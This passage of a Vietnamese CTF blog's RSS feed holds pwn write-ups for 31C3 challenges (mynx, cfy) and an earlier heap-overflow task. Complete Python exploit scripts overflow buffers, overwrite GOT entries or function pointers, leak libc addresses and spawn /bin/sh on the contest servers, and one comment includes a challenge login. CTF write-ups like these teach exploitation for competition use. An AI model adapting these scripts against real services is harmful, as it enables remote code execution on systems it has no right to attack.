+<p>Vùng nhớ tổ chức trong mem như sau (tạo 2 block với data size = 16:</p>
+<p><a href="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2015-01-12at111248AM_zpsca72a939.png"><img src="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2015-01-12at111248AM_zpsca72a939.png?resize=604%2C197" alt="" width="604" height="197" data-recalc-dims="1" /></a></p>
+<p>Gồm 3 block: block head được khởi tạo mặc định khi chạy chương trình.</p>
+<p>Để ý phần data của block được cấp phát là 1 đoạn đằng sau block, tôi sẽ đề cập sau ở phần khai thác lỗi.</p>
+<h5><strong>Phân tích hàm edit</strong></h5>
+<p>Nhập name,và size, hàm sẽ duyệt qua linked list để tìm ra block có tên tương ứng, và cập nhật lại phần data.</p>
+<p>Để ý phần sau:</p>
+<p><img class="alignnone" src="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2015-01-12at111102AM_zpse1ead7c3.png?resize=604%2C299" alt="" width="604" height="299" data-recalc-dims="1" /></p>
+<p><img class="alignnone" src="https://i0.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2015-01-12at111018AM_zps6288871d.png?resize=604%2C176" alt="" width="604" height="176" data-recalc-dims="1" /></p>
+<p>Chương trình đọc từ stdin vào data <strong>nbytes</strong>, mà nbytes không check length.</p>
+<p>Nếu tạo 2 block liền nihau thì, phần tiếp theo phần data của block 1 là block2 nên ta có thể overwrite được cái block 2.</p>
+<h5><strong>Phân tích hàm get:</strong></h5>
+<p>Nhập vào tên block và size, tìm ra block tương ứng, in phần data ra màn hình, free vùng data và block, cập nhật lại linked list. Để ý <strong>write(1,node-&gt;data,n); mình sẽ dùng nó để leak addr</strong></p>
+<p><img class="alignnone" src="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2015-01-12at111000AM_zpsc4f6c36a.png?resize=604%2C197" alt="" width="604" height="197" data-recalc-dims="1" /></p>
+<h4>Khai thác lỗi.</h4>
+<p>Ở đây mình sẽ overwrite địa chỉ <strong>data</strong> bằng địa chỉ của một hàm trong bảng got bằng cách lợi dụng phần <strong>read(0,node-&gt;data,node-&gt;size)</strong></p>
+<p>Để ý hàm free(node-&gt;data) nhận input là phần data nhập vào, ý tưởng là overwrite free trong bảng got là system và ta có, system(node-&gt;data).</p>
+<p>Payload của mình làm theo các bước như sau:</p>
+<ol>
+<li>Tạo ra 2 block <strong>peter123,lol123</strong> với data size của mỗi block là 16 bytes</li>
+<li>edit block<strong> peter123</strong>: với size 56, 'D'*28 + '\x00' * 16 + 'CCCC', với CCCC =&gt; địa chỉ hàm free, sở dĩ mình padd '\x00'*16 byte để làm name của block2 = 'DDDD'.</li>
+<li>edit block 2 ('DDDD') với size 4 bytes để ghi đè free trong bảng got ở đây mình ghi đè got bằng địa chỉ của lệnh ret, mục đích là để bypass qua hàm free, vì mình lợi dụng lệnh ret để leak 1 địa chỉ trong bảng GOT.</li>
+<li>get block 2('DDDD') minh sẽ leak được 1 địa chỉ trong bảng GOT, từ đó tính được địa chỉ hàm system.</li>
+<li>Tạo tiếp 2 block bất kì (<strong>b1,b2</strong>) với data size của mỗi block là 16 bytes</li>
+<li>edit block1('b1') ghi đè địa chỉ data của block 2 bằng địa chỉ free một lần nữa</li>
+<li>edit block2() để ghi đè free bằng system.</li>
+<li>Tạo ra block 'shell' với phần data='/bin/sh'</li>
+<li>get block('shell') và boom đã có được shell</li>
+</ol>
+<p><a href="https://i2.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2015-01-11at30525AM_zps9153b11c.png"><img src="https://i2.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2015-01-11at30525AM_zps9153b11c.png?resize=604%2C326" alt="" width="604" height="326" data-recalc-dims="1" /></a></p>
+<p><a href="https://i1.wp.com/i289.photobucket.com/albums/ll229/danh_st/johncena.gif"><img src="https://i1.wp.com/i289.photobucket.com/albums/ll229/danh_st/johncena.gif?resize=312%2C176" alt="" width="312" height="176" data-recalc-dims="1" /></a></p>
+<p>Payload: http://pastebin.com/n2G30Fk4</p>
+]]></content:encoded>
+									<post-id xmlns="com-wordpress:feed-additions:1">237</post-id>	</item>
+		<item>
+		<title>[Write up] 31C3 mynx</title>
+		<link>https://babyphd.net/2015/01/03/write-up-31c3-mynx/</link>
+				<pubDate>Sat, 03 Jan 2015 10:01:27 +0000</pubDate>
+		<dc:creator><![CDATA[peternguyen]]></dc:creator>
+				<category><![CDATA[pwn]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=229</guid>
+				<description><![CDATA[Đây là một bài khá hay, mình phải mấy mấy tiếng đồng hồ để phân tích code. Đầu tiên chương trình tổ chức bộ nhớ, cấp phát như sau: Cấp phát 1 vùng nhớ 0x1000 bytes đầu tiên, và set 4 byte kế tiếp là length &#60;địa chỉ vùng nhớ&#62;&#60;độ dài phần tử&#62;(1) Vùng nhớ &#8230; <a href="https://babyphd.net/2015/01/03/write-up-31c3-mynx/" class="more-link">Continue reading <span class="screen-reader-text">[Write up] 31C3 mynx</span> <span class="meta-nav">&#8594;</span></a>]]></description>
+								<content:encoded><![CDATA[<p>Đây là một bài khá hay, mình phải mấy mấy tiếng đồng hồ để phân tích code.</p>
+<p>Đầu tiên chương trình tổ chức bộ nhớ, cấp phát như sau:</p>
+<p><a href="https://i2.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at80513PM_zps8cb11523.png"><img src="https://i2.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at80513PM_zps8cb11523.png?resize=604%2C229" alt="" width="604" height="229" data-recalc-dims="1" /></a></p>
+<p>Cấp phát 1 vùng nhớ 0x1000 bytes đầu tiên, và set 4 byte kế tiếp là length &lt;địa chỉ vùng nhớ&gt;&lt;độ dài phần tử&gt;(1)</p>
+<p>Vùng nhớ 0x1000 bytes này được chia nhỏ ra 16 phần, 1 phần là 256 bytes.</p>
+<p><img class="alignnone" src="https://i0.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at80606PM_zpsc221f81d.png?resize=604%2C198" alt="" width="604" height="198" data-recalc-dims="1" /></p>
+<p>Nếu vùng nhớ 0x1000 bytes này hết , chương trình sẽ tạo 1 vùng nhớ khác tiếp theo như (1)</p>
+<p>Cấu trúc của một ascii art được phân bố như sau:</p>
+<p><img class="alignnone" src="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at80632PM_zps39c04618.png?resize=604%2C149" alt="" width="604" height="149" data-recalc-dims="1" /></p>
+<pre class="lang:c decode:true">struct ascii_art{
+     char tag; // tag của ascii_art có giá trị bằng 'I'
+     int id;
+     void (*filter)(char* content);
+     char content[247];
+};</pre>
+<p>Cấu trúc của một comment được phân bố như sau:</p>
+<p><a href="https://i0.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at80645PM_zps60860a85.png"><img src="https://i0.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at80645PM_zps60860a85.png?resize=604%2C104" alt="" width="604" height="104" data-recalc-dims="1" /></a></p>
+<pre class="lang:c decode:true">struct comment{
+    char tag; // tag có giá trị bằng '7'
+    int id;
+    char content[251];
+}</pre>
+<p>Xem xét đoạn mã sau:</p>
+<p><img class="alignnone" src="https://i2.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at80625PM_zps3f35d054.png?resize=604%2C83" alt="" width="604" height="83" data-recalc-dims="1" /></p>
+<p>Sau khi tạo 1 block comment, chương trình đọc vào vùng content với giá trị là 252 bytes (lố 1 byte) dựa vào đây mình sẽ khai thác được lỗi, ghi đè giá trị tag của block kế, biến block comment -&gt; block ascii art, từ đó fake được filterfunc.</p>
+<p><a href="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at80916PM_zps2f85890b.png"><img src="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at80916PM_zps2f85890b.png?resize=604%2C337" alt="" width="604" height="337" data-recalc-dims="1" /></a></p>
+<p><a href="https://i2.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at81442PM_zpse2e136b0.png"><img src="https://i2.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at81442PM_zpse2e136b0.png?resize=604%2C132" alt="" width="604" height="132" data-recalc-dims="1" /></a></p>
+<p>đoạn mã trên dùng để trigger bug khi biến block comment -&gt; block ascii art</p>
+<p>Các khai thác lỗi:</p>
+<pre class="lang:default decode:true">Tạo 1 block ascii art, tạo 2 block comment cho block ascii 1 , tạo block ascii art 2
++----------------------+
+|  Ascii Block 1       |
++----------------------+
+|  comment 1(1)        |
++----------------------+
+|  comment 2(1)        |
++----------------------+
+|  Ascii Block 2       |
++----------------------+
+
+Xóa hết comment block 1, tạo lại comment cho block 1 và block 2, dùng comment block 2, overwrite giá trị tag của Ascii Block 2 thành comment, dùng comment block 1 để overwrite comment block 2 thì Ascii Block 2
+
++----------------------+
+|  Ascii Block 1       |
++----------------------+
+|  comment 1(1)        |
++----------------------+
+|  comment 1(2)        |
++----------------------+
+|  Ascii Block 2       |
++----------------------+
+
+Trạng thái cần đạt được
+
++--------------------------------+
+|  Ascii Block 1                 |
++--------------------------------+
+|  comment 1(1)                  |
++--------------------------------+
+|  comment 2(1),block 2 fake     |
++--------------------------------+
+|  Ascii Block 2, comment 2 fake |
++--------------------------------+
+
+</pre>
+<p>Trigger bug và ta có</p>
+<p><a href="https://i0.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at81310PM_zps714162e4.png"><img src="https://i0.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at81310PM_zps714162e4.png?resize=604%2C458" alt="" width="604" height="458" data-recalc-dims="1" /></a></p>
+<p>Do mình có thể control được filter_func và content, cho nên mình sẽ dùng printf và fmt để leak được địa chỉ __libc_main_start ở trên stack, từ đó tính được địa chỉ của hàm system</p>
+<p>Payload:</p>
+<pre class="lang:python decode:true  ">import socket
+from struct import *
+import telnetlib
+
+#+------------------+
+#|	Ascii Block 1 	|
+#+------------------+
+#|	comment 1 		|
+#+------------------+
+#|	comment 2 		|
+#+------------------+
+#|	Ascii Block 2 	|
+#+------------------+
+
+def connect(host,port):
+	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+	s.connect((host,port))
+	return s
+
+def add_ascii_block(s,block):
+	s.send('1\n')
+	s.recv(1024)
+	s.recv(1024)
+	s.send('1\n')
+	s.recv(1024)
+	s.send(block)
+
+def add_comment_block(s,block):
+	s.send('1\n')
+	s.recv(1024)
+	s.send(block)
+
+def select_block_id(s,block_id):
+	s.send('3\n') # select
+	s.recv(1024)
+	s.recv(1024)
+	s.send(str(block_id) + '\n')
+	s.recv(1024)
+	s.recv(1024) # comment menu
+
+def back_to_main_menu(s):
+	s.recv(1024)
+	s.recv(1024) # comment menu
+	s.send('0\n') # back
+	s.recv(1024) # main menu
+	s.recv(1024)
+
+def leak_mem(s):
+	__libc_main = 0
+	fmt = '%p'*22 + '%s'
+	payload = pack('&lt;I',0x8048420) # printf
+	payload+= fmt + 'A'*(0xfb - 4 - len(fmt)) + '7'
+
+	s.recv(1024) # banner
+	s.recv(1024) # main menu
+	add_ascii_block(s,'A'*0xf6 + '\n') # add ascii block
+	s.recv(1024)
+	s.recv(1024) # main menu
+	select_block_id(s,1)
+	add_comment_block(s,'C'*0xfb + '\n') # add comment of block 1
+	s.recv(1024)
+	s.recv(1024) # comment menu
+	add_comment_block(s,'C'*0xfb + '\n') # add comment of block 1
+	back_to_main_menu(s)
+	add_ascii_block(s,'B'*0xf6 + '\n')
+	s.recv(1024)
+	s.recv(1024) # main menu
+	select_block_id(s,1)
+	s.send('2\n') # remove all comments of block 1
+	s.recv(1024)
+	s.recv(1024) # comment menu
+	add_comment_block(s,'D'*0xfb + '\n') # add comment of block 1
+	back_to_main_menu(s)
+	# add comment to block 2, change ascii block 2 into comment block 2
+	select_block_id(s,2)
+	add_comment_block(s,payload)
+	back_to_main_menu(s)
+	select_block_id(s,1)
+	# change 1st comment of block 2 into block 2
+	s.send('2\n') # remove all comments of block 1
+	s.recv(1024)
+	s.recv(1024) # comment menu
+	add_comment_block(s,'A'*0xfb + 'I') # mark that comment 1 of block 2 is block 2
+	back_to_main_menu(s)
+	select_block_id(s,2)
+	s.send('3\n') # trigger bug
+	d = s.recv(1024)
+	if '\xf7' in d:
+		index = d.index('\xf7')
+		__libc_main = d[index - 3:index + 1]
+		__libc_main = unpack('&lt;I',__libc_main)[0]
+	s.send('0\n') # back
+	s.recv(1024) 
+	s.recv(1024) # main menu
+	return __libc_main
+
+def exploit():
+	s = connect('188.40.18.80',1234)
+	__libc_main = leak_mem(s)
+	offset = 149824 # Ubuntu 14.10
+
+	if (__libc_main &amp; 0xf7000000) == 0xf7000000:
+		system_addr = __libc_main + offset
+
+		cmd = '/bin/sh\x00'
+
+		payload = pack('&lt;I',system_addr)
+		payload+= cmd + 'A'*(0xfb - 4 - len(cmd)) + '7'
+		print '[!!!] System(): ',hex(system_addr)
+
+		add_ascii_block(s,'A'*0xf6 + '\n') # add ascii block
+		s.recv(1024)
+		s.recv(1024) # main menu
+		select_block_id(s,3)
+		add_comment_block(s,'C'*0xfb + '\n') # add comment of block 1
+		s.recv(1024)
+		s.recv(1024) # comment menu
+		add_comment_block(s,'C'*0xfb + '\n') # add comment of block 1
+		back_to_main_menu(s)
+		add_ascii_block(s,'B'*0xf6 + '\n')
+		s.recv(1024)
+		s.recv(1024) # main menu
+		select_block_id(s,3)
+		s.send('2\n') # remove all comments of block 1
+		s.recv(1024)
+		s.recv(1024) # comment menu
+		add_comment_block(s,'D'*0xfb + '\n') # add comment of block 1
+		back_to_main_menu(s)
+		# add comment to block 2, change ascii block 2 into comment block 2
+		select_block_id(s,4)
+		add_comment_block(s,payload) # real payload
+		back_to_main_menu(s)
+		select_block_id(s,3)
+		# change 1st comment of block 2 into block 2
+		s.send('2\n') # remove all comments of block 1
+		s.recv(1024)
+		s.recv(1024) # comment menu
+		add_comment_block(s,'A'*0xfb + 'I') # mark that comment 1 of block 2 is block 2
+		back_to_main_menu(s)
+		select_block_id(s,4)
+		s.send('3\n') # trigger bug
+		print '[!!!] Shell is comming'
+		# interact socket with stdin,stdout
+		t = telnetlib.Telnet()
+		t.sock = s
+		t.interact()
+
+exploit()</pre>
+]]></content:encoded>
+									<post-id xmlns="com-wordpress:feed-additions:1">229</post-id>	</item>
+		<item>
+		<title>[Write Up] 31C3 cfy</title>
+		<link>https://babyphd.net/2015/01/03/write-up-31c3-cfy/</link>
+				<pubDate>Sat, 03 Jan 2015 10:00:35 +0000</pubDate>
+		<dc:creator><![CDATA[peternguyen]]></dc:creator>
+				<category><![CDATA[pwn]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=227</guid>
+				<description><![CDATA[Chạy chương trình, hiện ra 1 menu: What do you want to do? 0) parse from hex 1) parse from dec 2) parse from pointer 3) quit Chương trình parse input option vào như sau : option người dùng nhận vào ở rbp-0xc &#160; Kiểm tra giá trị rbp-0xc nếu bằng 3 thì thoát. Nhận input người dung &#8230; <a href="https://babyphd.net/2015/01/03/write-up-31c3-cfy/" class="more-link">Continue reading <span class="screen-reader-text">[Write Up] 31C3 cfy</span> <span class="meta-nav">&#8594;</span></a>]]></description>
+								<content:encoded><![CDATA[<p>Chạy chương trình, hiện ra 1 menu:</p>
+<pre class="lang:default decode:true">What do you want to do?
+0) parse from hex
+1) parse from dec
+2) parse from pointer
+3) quit</pre>
+<p>Chương trình parse input option vào như sau :</p>
+<p><a href="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at101738AM_zps0db0c6e5.png"><img src="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at101738AM_zps0db0c6e5.png?resize=604%2C346" alt="" width="604" height="346" data-recalc-dims="1" /></a></p>
+<p>option người dùng nhận vào ở <strong>rbp-0xc</strong></p>
+<p>&nbsp;</p>
+<p><img class="alignnone" src="https://i0.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at101756AM_zps82fd6b1e.png?resize=604%2C145" alt="" width="604" height="145" data-recalc-dims="1" /></p>
+<p>Kiểm tra giá trị<strong> rbp-0xc</strong> nếu bằng 3 thì thoát.</p>
+<p><img class="alignnone" src="https://i0.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at101819AM_zps71f3f5cc.png?resize=604%2C398" alt="" width="604" height="398" data-recalc-dims="1" /></p>
+<p>Nhận input người dung vào địa chỉ <strong>0x6010e0</strong> dùng option mà người dụng chọn tính ra hàm tương ứng cần gọi (<strong>0x601080</strong> lưu địa chỉ các hàm : fromhex,fromdec,fromptr)</p>
+<pre class="lang:default decode:true">rax = (long *)0x601080[$(rbp-c)]; mov rdi,0x6010e0; call eax;
+</pre>
+<p>để ý lúc kiểm tra option nhập vào trương trình chỉ kiểm tra đk $(rbp-0xc) != 3 thì sẽ execute đoạn trên. Để ý địa chỉ input lớn hơn địa chỉ lưu trữ các hàm, nếu nhập input &gt; 3 thì ta sẽ có : <strong>0x601080 + $(rbp-0xc)*8 </strong>với 1 giá trị x của <strong>$(rbp-0xc)</strong> thì eax sẽ trỏ tới input của mình và mình có thể kiếm soát đc call eax.</p>
+<p><img class="alignnone" src="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at102146AM_zps22cbdb58.png?resize=604%2C483" alt="" width="604" height="483" data-recalc-dims="1" /></p>
+<p>Ngoài ra, hàm fromptr có thể cho phép mình đọc bất kỳ vùng nhớ nào.</p>
+<p>Payload sẽ là:</p>
+<p>- dùng hàm fromptr để leak địa chỉ 1 hàm trong libc, dự đoán phiên bản libc đang chạy trên server (ở đây là ubuntu 14.10) , có offset từ hàm đó đến system</p>
+<p>- sử dụng bug trên để eax=system, và argv = /bin/sh</p>
+<pre class="lang:python decode:true  ">import socket
+from struct import *
+import telnetlib
+# 116064
+# Login: cfy_pwn // 31C3_G0nna_keep&lt;on&gt;grynding
+def connect(host,port):
+	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+	s.connect((host,port))
+	return s
+
+def build_payload(system_addr):
+	shell = '/bin/sh\x00'
+	buff_addr = 0x6010e0
+	func_addr = 0x601080
+
+	payload = shell + '\x00'*8
+	jmp_offset = 6 + (len(payload) &gt;&gt; 4)
+	payload += pack('&lt;Q',system_addr) + '\n'
+
+	return (jmp_offset,payload)
+
+def exploit():
+	offset = 179728
+
+	s = connect('188.40.18.73',3313)
+	s.recv(1024) # banner
+	# leak libc addr
+	s.send('2\n')
+	s.recv(1024)
+	s.send(pack('&lt;Q',0x601018) + '\n') # puts@got
+	leak_addr_str = s.recv(1024).split('\n')
+	leak_addr = int(leak_addr_str[1].replace('hex: ',''),16)
+
+	system_addr = leak_addr - offset
+	print '[+] system():',hex(system_addr)
+	jmp_offset,payload = build_payload(system_addr)
+	# send payload
+	s.recv(1024)
+	s.send(str(jmp_offset) + '\n')
+	s.recv(1024)
+	s.send(payload)
+
+	# interact socket with stdin,stdout
+	t = telnetlib.Telnet()
+	t.sock = s
+	t.interact()
+
+exploit()</pre>
+]]></content:encoded>
+									<post-id xmlns="com-wordpress:feed-additions:1">227</post-id>	</item>
+	</channel>
+</rss>
